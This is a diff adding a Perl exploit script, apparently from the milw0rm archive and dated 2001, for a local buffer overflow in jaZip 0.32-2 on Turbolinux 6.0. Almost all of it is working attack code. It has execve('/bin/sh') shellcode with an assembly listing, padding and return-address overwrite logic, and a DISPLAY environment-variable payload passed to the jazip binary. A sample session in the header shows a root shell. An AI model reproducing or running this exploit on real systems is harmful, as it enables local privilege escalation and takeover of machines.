@@ -1,0 +1,64 @@
+#!/usr/bin/perl
+
+## jaZip Exploit / Tested version: jaZip-0.32-2 / anno 2000
+## <teleh0r@doglover.com> ||  http://teleh0r.cjb.net/ 
+## Vulnerable: Turbolinux 6.0
+##
+## [teleh0r@localhost teleh0r]$ rpm -q jaZip
+## jaZip-0.32-2
+## [teleh0r@localhost teleh0r]$ ./jazip-exploit.pl
+## Address: 0xbffff7ac
+## bash#
+
+
+$shellcode =                     # Shellcode by: Taeho Oh
+    "\xeb\x1f".                  #/* jmp 0x1f              */
+    "\x5e".                      #/* popl %esi             */
+    "\x89\x76\x08".              #/* movl %esi,0x8(%esi)   */
+    "\x31\xc0".                  #/* xorl %eax,%eax        */
+    "\x88\x46\x07".              #/* movb %eax,0x7(%esi)   */
+    "\x89\x46\x0c".              #/* movl %eax,0xc(%esi)   */
+    "\xb0\x0b".                  #/* movb $0xb,%al         */
+    "\x89\xf3".                  #/* movl %esi,%ebx        */
+    "\x8d\x4e\x08".              #/* leal 0x8(%esi),%ecx   */
+    "\x8d\x56\x0c".              #/* leal 0xc(%esi),%edx   */
+    "\xcd\x80".                  #/* int $0x80             */
+    "\x31\xdb".                  #/* xorl %ebx,%ebx        */
+    "\x89\xd8".                  #/* movl %ebx,%eax        */
+    "\x40".                      #/* inc %eax              */
+    "\xcd\x80".                  #/* int $0x80             */
+    "\xe8\xdc\xff\xff\xff".      #/* call -0x24            */
+    "/bin/sh";                   #/* .string \"/bin/sh\"   */
+
+
+$ret = 0xbffff7ac;  # May have to be modified.
+$len = 2100;
+$nop = 'A';
+
+if (@ARGV == 1) {
+    $offset = $ARGV[0];
+}
+
+for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
+    $buffer .= $nop;
+}
+
+$buffer .= $shellcode;
+
+print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");
+$new_ret = pack('l',($ret + $offset));
+$buffer .= $nop x 3; # May have to be modified / 5 for Debian.
+
+for ($i += length($shellcode); $i < $len; $i += 4) {
+    $buffer .= $new_ret;
+}
+
+if ($ENV{'DISPLAY'}) {
+    delete($ENV{'DISPLAY'});
+}
+
+local($ENV{'DISPLAY'}) = $buffer;
+exec("/usr/X11R6/bin/jazip");
+
+
+# milw0rm.com [2001-01-25]
